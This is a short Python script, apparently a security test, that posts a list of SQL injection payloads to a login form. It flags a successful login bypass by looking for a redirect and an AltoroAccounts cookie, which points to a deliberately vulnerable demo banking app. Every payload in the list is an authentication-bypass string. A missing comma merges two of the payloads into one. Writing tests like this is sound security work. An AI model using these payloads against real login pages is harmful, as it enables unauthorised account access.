import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

payloads = [ 
    "admin",
    "'"
    "'+--",
    "admin'+or+1=1+--"
]

class SqlInjection():
    @staticmethod
    def doLoginSqlI(url):
        exit_code = 0
        output = ""
        for payload in payloads:
            data = f"uid={payload}&passw=test&btnSubmit=Login"
            response = requests.post(url, headers=headers, data=data, allow_redirects=False)

            if response.status_code == 302:
                if 'Set-Cookie' in response.headers and 'AltoroAccounts' in response.headers['Set-Cookie']:
                    
                    output += f"[!] uid={payload},Se detectó inyección SQL en el login. \n"
                    output += f"\t Set-Cookie recibida: {response.headers['Set-Cookie']} \n"
                    print(f"[!] uid={payload},Se detectó inyección SQL en el login.")
                    print(f"\t Set-Cookie recibida: {response.headers['Set-Cookie']}")
                    exit_code += 1
                else:
                    output += f"[*] uid={payload}, Se recibió un {response.status_code}, pero no se encontró la cookie AltoroAccounts. \n"
                    print(f"[*] uid={payload}, Se recibió un {response.status_code}, pero no se encontró la cookie AltoroAccounts.")
                    exit_code += 0
            else:
                output += f"[*] uid={payload}, No se detectó el redireccionamiento {response.status_code} o el login falló. \n"
                print(f"[*] uid={payload}, No se detectó el redireccionamiento {response.status_code} o el login falló.")
                exit_code += 0
        return exit_code, output